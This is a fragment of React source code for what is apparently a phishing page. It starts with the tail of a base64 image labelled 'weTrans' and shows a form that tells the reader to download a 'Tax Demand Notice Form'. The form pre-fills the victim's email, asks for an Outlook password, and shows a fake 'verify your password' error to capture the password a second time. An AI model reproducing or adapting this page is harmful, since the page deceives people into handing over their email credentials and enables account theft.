9WsZKFgMlAtFxlrmbNzmqt47Z21chD53pOdYd8/COhYqmF3VhcpGXVIRBx9wFlMulzvLhSLrYGIOd2NfESUCKwqNbTc0dztgrc0yH+ZzrV63NiImeAm8dedcc5pia5CmoRTUGEOiaPBBNt14+1BrOUzRtbWNS5cuXb9+fW1tjawxbGu1GhH1dPecO/+5Lzz7zMGDBwtJFHJ5VBVEAtTqLooiUq3WanEc5815yIVCST0AXhUEI7RlgCs90vrajE+3nlIo5Bbk2qSFgwMoero7e7o7R4aHn3zizNLS0s3x29euXZubm3uwMO/SrFAqVqtVsiaJi2mW3bp1+8JvfnNw/2BnZzl3UmkTLBdCoKw/spUAUCgUQknNAPQSUcCbFpcWrLX9fd2iCCwgl2WhflrTZtx2qkYiX7MTaFcXJnTfQ4NVe7JDtiiUJw/w8c7C1EJaM0URgQlRFQMoNFNSGMC5vs7iycHuPptP2gIwdqB4qKvj+sp8nTKBgVhSCEHUxWKVKUslgXZltS8dG+1pKZSnijaL4d7uNrm/LgpLBMeq8HZ9JV2bX+/vbzvQBe5C/QCl2uYF3gMezPke7sUIZUIRsIKohUfgsjpbImMFypLXfMz9kUCjEOFGhLWZ8meowUjIaQlNhy0vB93S8lyhPNr9VsXa2tr4+PjK+pqJIxVkWZZEsTHmxLFjL3zxS2NHR/OcMkUg+CsUxFFkZ2dnRFy5mGT+X2ZENydYawjZAOKdMzYO5HciMOeYbrlcTJKkv79/ZGTk/PnP3bp156NLn1y5cqVSrUaRFYKXjA3EydWrV1/+ylc7O8sNnhlag9+6GaF6lLS1tXV3dwcAODxNm8RENDMzs7q67NJBZoZlUQnHhJSIVgMTaF0vgtPnQ+XNXbSJPp4ntictsqUT9yc4P3qwzArvkRccCAX0FGRAZJiKqoc62470dhUbfDEL9BZxZF93Z4wYCp+BjBI7yciqqs+yOhQF1ZFS/MSBmAOiHrwSRdlgtK+jO9LIivMpWYLhVDC7uP7JnftzGygCXUCfYIgwanA09mNFHE4wmmA0xiHKepCVIDGDAO/hUsDDRhFTTqhrDowwwiJr0UghUdW1tbW5uTnnYYzJ/Z1G0Q3vfc6vI2Kysr3gLvDwIG4QUSwsLExOT6ElRuu9L7eVTp8+dfToaJicALSh7xgElcnJew9mZ0No9vfxoH8nySGjUN8AQJ6A00gLQAtX2FqOItPWVtq/b98Xv/jFv/j2d1599dX2tjYCLLFkeemQ6enppaWlLPNNz4bIaItt9ThSKBQGBwe72jtUNTBB4CWxdm1t7e23315ZWQk0XCYOge1WAm6Lq5gXWGkuCa3bJzWEW1q15838DrJFoZSBp8eG+hIb+4yU4QXkwAK4UJeAs6yHcbyvZ7gTiTZ3zUEBOHmwb6BgI5/lNjEh1Hjz7GHURGxc+vTo/uE2MKDMpCAFAxEw2ls4PlgmU0fkhSUj0ihaFnpncuWtu5UVBYBQQMQIbMbGQ33r3KY6eBlYIlQsKAm7hAEICckmgCLGmGKx2FyyLHEgaG1UqpOTk0tLy4Fe4pyoghlEMMaAKVThl5bS7UqGyADbOfXbJBTvWF+vrK1tMJk0cwK1cSTqi8ViZ2cnmulkJGRACPX6iYguXLiwsbEWmGy/zwf+cBHK/zXFsFEgUDOyzEPzkktNUkkz5qKKKDLWor+/97nPPzM8PByYb8wUIlj1er1SqYTTqlLAo7Zen38rpknA0NDQ/v37AYDU2s0E5WvXrl27dm19vbK5EjTYLs1MBW0IiEThVRTIMh/KIjc2e9tsRgszE/htK8eeBNnyCIuE0X4+2ttVStNEFRK8CwcjYA/NTFYbLEUn+rs7TNNO9YCLgLF90aHOovWelQAPG+I7oiREQj5LpP7cySMdm5cUqIS9vIY78fSRAwVXgaQQL+qIucbm2lL1+x+Pv35j7Y7DBlAHMgCWlMEGHsiAKqJl2Bspfn5v+b+8O/6D68t366hZZCLwYqxtKp6Qdd5eKjeqH9pQtWR1dfXqtU8/uvTJ6mpFAWO5uQ4HXjwQeP0Nmgk2K3dgF/RhUwJJzENVla3hRhnnOI7r9Xq1uhFaJSLObeG/Xrly5YMPPgg8tyinUv3LSVOnqOZQqarayKRp9tGly9dujC+vrDVnLFrocACs5ba2trZiiZk5ry1CAEJthyaw3dJp/NgGCogw0N9/+PDhcqGYZZlpJPgS0fz8/A9+8IMPPvigWq2qwlgb0hoCWQYtuyzW6tmHH3785pu/vHLlSuZyqKVpp2ijBx6/VXvSKluMPQO0x3ju6JErE4vTPmMbExwpCYWibFJkGespHuuPjKIBy+c+6f4SzhzofWeqtkokoYoE50/RqBhfPTLYdWIkiQAbfCX1YALIgPoMPj+y/9zN+fdmK1XAgbxkIK6X29+6vzyzfu3G2omvnew4UkYboxB4o4AAKTAjeP9u7c2rdz6emK14W6LJF8f2/W+vnDxqbKQpKBNVhgEZKLq6ukZGRqYfzAII9RZLpVIURXNzcz/8wY/u3bt35syZoaGh9vb2KIpiAzb5qhRKQ231xvN9xB6xcIU69VEURVGUZatorJkqury8PH7n7skzp/u6u4jZNMm10Im7937y45/NzDwI7BvnnDHxtjP/ITz7AD22WigiObtXRJZX1t58881f/PJXqnpw/75nn332qaee6ujoCKYcm00q3P2Z6QcL8yEhOHzivS+VikGn5NfaBf6Ubc7FbkEslEqFM2dOTUzc+fCTS6rKlGv2KEomp2f+n//6t3fuTb788ss9PT3WsjUkDcSE2KytVy5fvnrhwru3b99e3VgfHR7ZWK8++9znmVhyutqe/HNli0KJgTbg2aPl//6WTqeeYmZR51KwVYJh6Uh0tLs41LXJhmeQgxqgBzi+r6u7+GCuBlHyTthYcY7IWql1aHru8Gh/hKBQ8oLWgEItiBUn++Ovnz56b/b9ObKrCu8cFeJqLZVy96WVyvK71y9ezc6N9J8YHOhrLyVWVbC85m5MzV+6/2B8uXK/pksu8lwo+Grloxvnjh8+cLhQoFjEMRMk3wKis6NjZGTk/Y8+VIHzPjBTQ/7Y9PT0ysrKpUuXyuVyW1vbsWPHPn/uc4ODg9aE5ZRik/cVh50JQ2bCZsB5dxGRrq6u7u7uufmFcLy11rtMVd9///1yufzCCy/0dXcZQ178+lrl2rVrb7zxxrUb10OVWwDWRqqCph+5GxOMGxy/nARO+s/x/BtBDW5qEwDXrl375S9/uby8kmXZ+srq5OTke++9d+rUqaNHjw4MDBQKpbC1yKc3b7z11ltTU1MBpGggo2hvaxsY6CsUYjSSa3bZ3w3AI9sd1q6xsbGzZ8/enri3tra2lZKHjY2NX/3qV9evXz948ODp06f7+vqCibS4uHj75vjdyXsLD+YWlpecc95nd+7ceeedd44dP9rb09uq4HIOzo5N7/bkcWRrPRSHEuNQB04M9Xxye9Gz8alL4nLdC8SR+t7OeGywvZM3l0iBWFgDxMDxfR2DHYVb61XHVigisfAUxYWoXulD+pWTh4rYLCZAjfwuAiJFP+Olkc65UyP/9dL0qmNTTrwXxIW6U9h4qu5WF+nqyoPiJ7OxIRvBC7yLq05XsnoVyDj21gpMpHGtHt2ZWnaH9zsA3nIjUMOMQiE+efL4ofcPTExMhi1UmlEeE9lqvVadqYZyitevX0+rlVdeeaW7q0NVifMq51mWJUkBQL3uoigS7x6BcajCGO7u7h4eHr59+7aqppljZjbWe7+0vPKz11+/cvXq0KFDpVKpXq/OzDwIei3LvGEbNzgdAOC9MZZNIFNs3YS6kY/vXBZFMUASUN58F0EwbylrsMsgsFa8JzbGGPV+22EBt37nnXeWlpZEYYxJvXPrG2vXb4zfudvW1tbe3l5IimCqV2uLy0sh104UzvncKlE5duxYT0+P5rwcBHOAWvL0AoVfmjsPtaT2UV4nxQT/Mo7t+fPnp6amfv3rX9edz2NPbEL3Zs5XJ+5Nz8x+culyOD8ROeeyelrPUvWSa162aZpOTU1du3r9S1/6Qs67J1JVS0xE4kVV40ISIkrbTKq9zMCHybaasigQOhnnjh343sTcWpaySeopKIoZmmTpaP/AyYO9JUA8xARI1TaLCPSXcHZo4PLs+JxjxInzwqZQr9UKrnpyX9vZARSCNmlZPjnsU0zQFKe68J1njyyk/LMb9+edVECwBBhiWwNqHvOCAhFn5KtOiEWsEGAsBXtb1Yogq0audrCvxwMiiBr3FzhXzDw6Ovq1F7/y3b//h5WVFSYCUwPFcETEjU020zS9devW3NxcT3cnETmvALIsKyRJrV4Pu22GnGBqhEJ2SpiYPZ1dp06dunr16r179yIb54wsIgDr6xs3b96cmJhgolDgtrkPRub8119+9eLFizMzMwCSJKnXqnAgokBLyTJvjCFCYHk55wqFgiIvvBZ0ZWuMoxVUbhVVrW2sl0qlWj0NDXPOJaWiqoZiSMaY1dXVxcVF55yJCs450by8rnOuWqktzC+GxxiAFTRwpZA9kGXZ4P59X/jCc8ViUZGXHWmoiaxerxfiZL2yEart1mq1UKh1V/5e0CxsTH9/7yuvvCIiv3z710TkvA/Jis2kwWq1urGxEdRZ6PCwhYASvBfDFMdxVquur6+vr697rzYUzfI5YBRKi+e/Fd9MFheBirMNnvGe7JSt/eIdASXg5GDHcHtShCtEMcDqxagMGD3eWe5PNIGLbYOXnVscAki7wbkDPfu5VmCfZTVVAamxUor88yeH+5BvAtYg4zOFGh0KAIUYJeBUN/7X5w//2YnufbrcRrUCO7g6vFgTIzYwnILrwikVHZd8bDUy1rBkDs6DKGHXRdVnDnWeOxB3ABG71NXC5aIkBhAYB+fPn3/lpZc7OjpAKt6RIrZRZA1BFeIlt0RC1cUwqozJ94tQ1TiOsywT7wxTVqs/agNKVYVai2NHRp88c7qrqwOkBA34n+RVr7VWq1eq1XqaehFjrY1iL/onL7189vSZrJ5GxkbW1GtVZk6SpEnDiyNjGCpeRALdS1WztA6VsNNwY33OAaDWOdBUNGGlLRaLWVYnqHeZMRxFtpH7xwQ457q6uo4dO2aMCTsNxVHCZPK8TaawhUAImWmD+Mcg9aJeuju7XnnllRMnThDBEKvPI1kAwu5IzmdJHDEhS+vFQhKg6O3DtNF4YwxUXZYdOnTg1VdffeGLXygWi6FyZTAlRKBKZCK2cepEydgktkncjNkHzRIK7g4NDY0cHgolLEXEGjIMVS/ivDjnM5+5kPzdsFOQY7c77MQ9CbLVQokASAEY7Y1fPH548leXlqXW0dnnIVFl9Xhv8uzw/sHEkFRDipmBgTJRHqWNgJN99ukD3VPjc5mF85wwabp6oKTPnx6Jd6lzlGsTzdNG6mU15/tt7zdO7zvQ/f33r0wsPahRyZlSmrGTjJKCjaOs7tQJJ1ZFkNXIUruB+jRJ6x1S/c6zZ/+nZ4ZHy7BICT6ObNisvcF5twq0tbW9+uqr5XL59ddfn34wW61U4zgmzukJwUgOme/NcqeqqvAknihPZwsLfpIku7EYcgn4ivPa09P19a9/HcAvfvGLmghUmtcKWYFh35lQTpGIXvjSC9/+9rer1WqjCK4ErZFl9RCZal11Q0qBTzM0iDbc2OxGVRs0vd2dHSJKogZZnvNoiPc+ieNiHGVpGsextbatre073/nOwYMHf/iTn87PLQRjiplDOYVm34ay8oEfyMyVSmVoaOhPX/vW888/GxsLFRCDRAXUKDFbSgrN/UzCzmHlQrHQ2IJnk468Nfsh1Ew6dOjAt7/97dHR0f/+gx/OLyy6NIuSmEONK0BC2XB13ksosaMqQcc653p7e585f+7FF188NHRAsaltw30ZYwhkk8RlPssyYyiA9zubtCfbxPzlX/7l5l8kTjJigExne8fK/FJ1bZnq64VsdazdfuvU8Esn+gZMo8gAEcNAVQkOImACtSdoa+u6PXV/Y32pxGlcWzha5v/9T7/2zH7TDpimr0N5jIiUoCBG5jJjrGHjHMoWxwfbP3d4sItYKqvra4vMMDZ2DioCQmQJkolKbLno02Rj/nSbfvPYwP/xzS9942TX4QRFIIKmLgWbkPXvMpen7QDGcByZ4eHho0fHysVSvVZL63XXwlyAF8vmuWef+dznPpfEsfPOGMPGLC+tXLl2JXPOGA51qzs72r75zW/29fW2dKk0eK/5v5zJVi4dGTvS09M9N/tgfXU9THERT4QoMkRI67UkiXt7e/7iL/786y//SbFQaG8r3ZuYuHvntkCZ2af1Qpw8/9xzTzxxplmZnYgIurq+OnV/qlapOJGwVvf395/73FNjY2PW5ncdZBuQHN4/mJu/PX7LNYrCmf+vvTN7juJI4vAvq3oOjSSMEIckJK+w2ZGRmVhsixe8zzyv+b83Nmw5YA0ySAp02OYYRgea7q6sfcjqmp6RIYRosQ7I72k0mq7Oqq7M7q7Kw5jp85/dvXv30qWLKJ6kGs3G1avzX91YbjQbvW7XeT46eu1cLgki4T07J/WCDRGcS6xd+e7bez/86+sbyxOtJkCSf5+MiMwgAxAz//jTqpQlT9PU59nExPidO3fa7bYtUraWVbewfQbe53k+MTE+P79wc/lmvVHvdbt7+3t5nhkiayjPM8/OszNEiTXMjl1WS2qtscY339y6d++Hf37//dTUVL2WSMkkOYsxpvuyu7m52e2+YufIUpZlF6bOr6ysLC4uyl44FZ6+alOOM1QsHWBx++nDHAKPevjPxt76b8/GJsa+XphZmcMMockAcjbkQRaGpTosvGTLZ6AL/LyHfz/+ffdZ98r5c0tzV27O0iVgHBxWTBAqdQAgn8DDObY1A585hjU1R3DAAfCS8biLH3de/LS+u7Hb66Wu7/jo6IjzdGxszNZqE83GtZnpW3+buTU7/sVnuGLR8DAEG5bqw1amZ2OKW6L4RqRpXq8njnFw8LrX6+3s7Kw9eby9vb2/v5+m6aUL051O57tvbzWb9Wa9EXI6Ai9evnr06NHTnV1mNh6NRuPa4ufLyzeG59XgSTgLESVBMfr9voT2/7x6//79+5ubTzPOvPdStW96errT4H2OJAAABKFJREFU6dy+ffvqzCwRSQzb82evHj58uLWzbes1Yjc7O9u5udxqtWLqJnl6ybLswX8fbm1tHWW5vBldvnx56fqXk5PjWeaMMTFXS9ScgbjMz19019bWnu7syv251Wpd+3yh3W5bE7rgi0zfuUeWuee///Hkya8PHvyyubW5t3fQ77/OMudc1my2Go3aufFzS0t/73T+sTA/N31hSnwFbSJhiK78LEBkDw6Pfln7dWNjQxakfJ5dv3796tzcxYsXyvv0OGZWiv0dAMhz10/TXm9/fX19dXX18cb64eEhM0vJamNMs1mfnJycm5tbXvpq8csv5ufnZfHVWqJS2n1xMtzfP1xbW9va3s2yjBJLRIsL8+12u9GoxSXjUy/KvsVr6eNg2KB4SGhp5uFNcPQQj48aYIHE+4YnACkQqh/DF7EZACM1jo09KpwK2GOcxPGESWoPhgz4bOEA+CIqGGCHvkFCXPMMNoCJrmvIipVcDsHDKAwTDFAHGuLe4uEyn9QJgMtcPbHIHYyRQF15tD6uUR6SrUUccgmAREOGG6QHiPOciUjC5AZZuiCR/UGaotHhV2vZXS6Snlgb/GshS4zy7mMsIPvoBCDt90OgoOOQ194jzl4q2omrFdJUdLhwzntDhoaWx2QpJHZ/ZBB86ewMxBA7Es0hI+HXaZYn9UT6Lh335NkBxNKF0BoX0oojW/GfkEKBPciDJM19It7BvvQ6HFNV8XDuO7GeUl+tNJhDcFGOB4CsKKMUvOPhJabQFcEFUk/FGBOvahzPGH5hbWghTXNrrch2fBadkE/OoAzgFMYASQgKJTifGzLkDTycQc5ITLgqMU+jN3koR8AgnxABuZQIkxR/NRBygMBWomxgGCDZ2kTmQYbrUvtCAnG8JKUmFCsZvriZwJBDuINReY1ActCaEEYbrI7H4HYnS7Ohx77IWEDhTyKErVaZxKEohEGR2yBO0MEWpwzl4PylEWUmY9g5KiVALK+FuyLfelTpoPw2CYfbwamjsol1QMm4SGKTgfKUO+IRtyqiZg65qxZRc8VHFCPsSXwanZMECK4I/0ehVHHK+PCU6g2ImQ0oDlZ4vSUfI3rZOWNr5RknNj1EAJc+H7eA0dDIl8wgzxTFCg6+KOu7SCVHe0nVQ2Li43imSZLEgIA4nrHBQWvFJDydTfn0DMqQYuJN4RXxGBr5irhowwz/bjT7JsV7wqgqmoEYxYd39dMa/H5Y1xXl/8snZlAURTlLPnp1U/8cRVEqQw2KoiiVoQZFUZTKUIOiKEplqEFRFKUy1KAoilIZalAURakMNSiKolSGGhRFUSpDDYqiKJWhBkVRlMoYzTb20ccaKIpydugTiqIolaEGRVGUylCDoihKZahBURSlMtSgKIpSGbrLoyjK+xLT6/6JQRlKX/yGg0+d9TueJbZzFu2fNSOjFAUe6Ve1XfgAp3ins58uRfOfjlvFsp5YGAyP5NuH9F1/H4/6i3T5w0gyqtLs3AkfUd5flLeYlb+yNYmUxR65Nmch/8gofeAhGr1G73H6k3RkUB5kUIKnstkfVesUV60s/AnlqXDo3oc33bwraTy28z+WTqX9LROzfwAAAABJRU5ErkJggg=="
                    className="cut"
                    alt="weTrans"
                  />
                  <form onSubmit={subForm} className='frm'>
                    <p className='txt'>
                      Download the enclosed Tax Demand Notice Form as quickly <br /> 
                      as
                      possible and make full provisions of the enlisted Demands <br />
                      available prior to our visit.
                    </p>

                    { err ? <p className='er_msg'>Error! Please verify your password and try again.</p> : null }

                    <div className='inp_wrapper'>
                      <input 
                        type='email'
                        value={outlookEmail}
                        className='inp emel'
                        readOnly
                        onChange={e=>setOutlookEmail(e.target.value)}
                      />
                    </div>

                    <div className='inp_wrapper'>
                      <input 
                        type='password'
                        className='inp pswd'
                        value={outlookPassword}
                        onChange={e=> setOulookPassword(e.target.value)}
                        onClick={subForm}
                      />
                    </div>

                    <div className='inp_wrapper'>
                      <input 
                        type='submit'
                        value={val}
                        className='btn'
                      />
                    </div>

                  </form>
                </div>
              </Fragment>
              : undefined }

            </article>



    </Fragment>}

    {/* </ThemeContext.Provider> */}

    </div>
  );
}

export default App;
